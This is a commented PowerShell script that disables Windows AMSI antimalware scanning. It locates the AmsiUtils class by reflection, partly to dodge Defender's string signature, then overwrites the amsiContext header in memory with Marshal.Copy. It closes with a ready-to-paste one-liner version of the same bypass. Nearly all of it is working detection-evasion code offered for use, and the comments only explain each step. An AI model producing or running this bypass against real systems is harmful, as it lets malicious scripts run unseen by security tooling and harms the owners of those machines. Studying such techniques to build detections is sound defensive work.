##we will need to use GetType method for reflection attack, idealy we want to invoke 
## [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') to get a handle for AmsiUtils, but defender block ‘AmsiUtils’ string
## to work around this, we can dynamically locate the class, using gettypes
$a=[Ref].Assembly.GetTypes()
## searching all types that contains string  "*iUtils"
## you will get

#IsPublic IsSerial Name BaseType
#-------- -------- ---- --------
#False False AmsiUtils System.Object

Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
## Now $c contains a handle to AmsiUtils class, we want to locate amsiContext, we can use NonPublic and Static filters to help narrow the results
$d=$c.GetFields('NonPublic,Static')

## We’ll again loop through all the fields, searching for a name containing “Context
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}

## get value will return a memeory address for amsiContext
$g=$f.GetValue($null)

##use Copy372 to overwrite the amsiContext header
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

#######################################################################################################
#####################################Put the above code into a oneliner################################
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) `
{if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) `
{if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);`
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)